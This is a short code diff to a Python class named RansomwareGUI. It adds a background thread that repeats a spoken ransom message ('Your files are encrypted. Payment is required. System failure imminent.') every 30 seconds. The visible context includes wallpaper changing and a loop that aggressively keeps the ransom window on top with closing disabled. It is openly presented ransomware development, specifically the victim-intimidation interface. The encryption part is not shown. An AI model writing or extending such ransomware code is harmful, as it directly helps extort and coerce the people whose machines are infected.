@@ -295,7 +295,7 @@ class RansomwareGUI:
         
         # Attempt Wallpaper & Voice
         self.master.after(2000, self.change_wallpaper)
-        self.master.after(3000, lambda: self.speak_message("Your files are encrypted. Payment is required."))
+        threading.Thread(target=self.audio_loop, daemon=True).start()
 
     def force_focus_loop(self):
         """Aggressively keeps window on top."""
@@ -314,6 +314,13 @@ class RansomwareGUI:
 
     def disable_event(self):
         pass
+
+    def audio_loop(self):
+        """Repeats the voice message every 30 seconds."""
+        message = "Your files are encrypted. Payment is required. System failure imminent."
+        while self.heartbeat_thread_running:
+            self.speak_message(message)
+            time.sleep(30)
 
     def speak_message(self, message):
         """Cross-platform TTS."""
